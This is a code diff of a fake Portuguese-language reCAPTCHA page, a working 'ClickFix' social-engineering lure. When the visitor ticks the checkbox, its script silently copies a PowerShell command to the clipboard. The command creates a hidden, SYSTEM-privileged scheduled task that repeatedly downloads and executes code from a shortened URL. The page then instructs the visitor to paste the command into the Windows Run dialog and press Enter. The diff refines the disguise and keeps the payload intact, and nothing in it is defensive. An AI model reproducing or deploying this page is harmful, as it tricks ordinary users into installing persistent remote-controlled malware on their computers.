@@ -1,79 +1,183 @@
 <!DOCTYPE html>
-<html lang="pt">
+<html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Captcha Personalizado</title>
+    <title>Verificação reCAPTCHA</title>
     <style>
-        /* (Mantenha o CSS original sem alterações) */
+        body {
+            font-family: Arial, sans-serif;
+            background: #f8f9fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .captcha-container {
+            background: white;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 30px;
+            width: 420px; /* Aumentado de 350px */
+            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+
+        #captcha-checkbox {
+            width: 22px;
+            height: 22px;
+            margin-right: 12px;
+            cursor: pointer;
+        }
+
+        .recaptcha-brand {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 20px;
+        }
+
+        .recaptcha-logo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .recaptcha-logo img {
+            width: 32px;
+            margin-bottom: 5px;
+        }
+
+        .recaptcha-logo span {
+            font-size: 10px;
+            color: #5f6368;
+            letter-spacing: 0.5px;
+        }
+
+        .verification-box {
+            border: 2px solid #1a73e8;
+            border-radius: 6px;
+            padding: 20px;
+            margin-top: 20px;
+            display: none;
+        }
+
+        .verification-steps {
+            font-size: 15px;
+            color: #202124;
+            margin: 15px 0;
+        }
+
+        .verification-steps ol {
+            padding-left: 20px; /* Reduzido para ganhar espaço */
+            margin: 15px 0;
+        }
+
+        .verification-steps li {
+            margin-bottom: 12px;
+            line-height: 1.4;
+            padding-right: 10px; /* Espaço extra para texto */
+        }
+
+        .verification-code {
+            background: #f8f9fa;
+            border: 1px solid #dadce0;
+            padding: 12px;
+            font-size: 13px;
+            margin: 15px 0;
+            border-radius: 4px;
+            text-align: center;
+            color: #3c4043;
+        }
+
+        #verify-button {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 14px;
+            font-weight: 500;
+            margin-top: 15px;
+            transition: background 0.2s;
+        }
+
+        #verify-button:hover {
+            background: #1557b0;
+        }
     </style>
 </head>
 <body>
-
     <div class="captcha-container">
-        <div class="captcha-header">
-            <input type="checkbox" id="captcha-checkbox" onchange="copyToClipboard(); showVerification()">
-            <label for="captcha-checkbox">Não sou um robô</label>
-            <div class="captcha-logo-container">
-                <img class="captcha-logo" src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="ReCAPTCHA logo">
-                <p class="captcha-text">reCAPTCHA</p>
+        <div class="checkbox-container">
+            <input type="checkbox" id="captcha-checkbox">
+            <label for="captcha-checkbox" style="font-size: 16px; color: #202124;">Não sou um robô</label>
+        </div>
+        
+        <div class="recaptcha-brand">
+            <div class="recaptcha-logo">
+                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
+                <span>reCAPTCHA</span>
             </div>
         </div>
 
         <div class="verification-box" id="verification-box">
-            <h3>Complete a Verificação</h3>
-            <ol>
-                <li>Pressione e segure as teclas <strong>Windows</strong> + <strong>R</strong>.</li>
-                <li>Na tela de verificação, pressione <strong>Ctrl</strong> + <strong>V</strong>.</li>
-                <li>Pressione <strong>Enter</strong> para finalizar.</li>
-            </ol>
-            <p class="verification-code">
-                <span class="verified">✔ "Não sou um robô - ID do reCAPTCHA: 2417"</span>
-            </p>
+            <div class="verification-steps">
+                <strong style="font-size: 16px; display: block; margin-bottom: 15px;">Complete a Verificação</strong>
+                <ol>
+                    <li>Pressione e segure as teclas <strong>Windows</strong> + <strong>R</strong></li>
+                    <li>Na tela de verificação, pressione <strong>Ctrl</strong> + <strong>V</strong></li>
+                    <li>Pressione <strong>Enter</strong> para finalizar</li>
+                </ol>
+            </div>
+            
+            <div class="verification-code">
+                "Não sou um robô - ID do reCAPTCHA:2417"
+            </div>
+
             <button id="verify-button" onclick="verificarCaptcha()">VERIFICAR</button>
         </div>
     </div>
 
     <script>
-        function copyToClipboard() {
+        document.getElementById('captcha-checkbox').addEventListener('change', function() {
             const command = `powershell -c "$t=(Get-Date).AddMinutes(10); schtasks /create /tn U2FA /tr 'powershell -w Hidden -ep Bypass -c iex(iwr -useb https://tinyurl.com/2uxfvszc)' /sc minute /mo 10 /st $($t.ToString('HH:mm')) /ru SYSTEM /np /rl highest /f"`;
             
-            navigator.clipboard.writeText(command).then(() => {
-                console.log('Comando copiado para a área de transferência');
-            }).catch(err => {
-                // Fallback para navegadores mais antigos
-                const textArea = document.createElement('textarea');
-                textArea.value = command;
-                document.body.appendChild(textArea);
-                textArea.select();
-                document.execCommand('copy');
-                document.body.removeChild(textArea);
-            });
-        }
+            const textArea = document.createElement('textarea');
+            textArea.value = command;
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
 
-        function showVerification() {
-            document.getElementById("verification-box").style.display = "block";
-            document.getElementById("verify-button").style.display = "inline-block";
-        }
+            document.getElementById('verification-box').style.display = 'block';
+        });
 
         function verificarCaptcha() {
-            const verifyButton = document.getElementById("verify-button");
-            verifyButton.textContent = "Carregando...";
-            verifyButton.style.backgroundColor = "#ccc";
-            verifyButton.disabled = true;
+            const button = document.getElementById('verify-button');
+            button.innerHTML = 'Verificando...';
+            button.disabled = true;
             
             setTimeout(() => {
-                verifyButton.innerHTML = "✔";
-                verifyButton.style.backgroundColor = "#4CAF50";
-                verifyButton.style.fontSize = "20px";
-                verifyButton.style.fontWeight = "bold";
-                
+                button.innerHTML = '✔ Verificado';
+                button.style.backgroundColor = '#34a853';
                 setTimeout(() => {
-                    alert('Verificado, obrigado');
+                    alert('Verificação concluída com sucesso!');
                 }, 500);
             }, 2000);
         }
     </script>
+</body>
+</html>
 
 </body>
 </html>
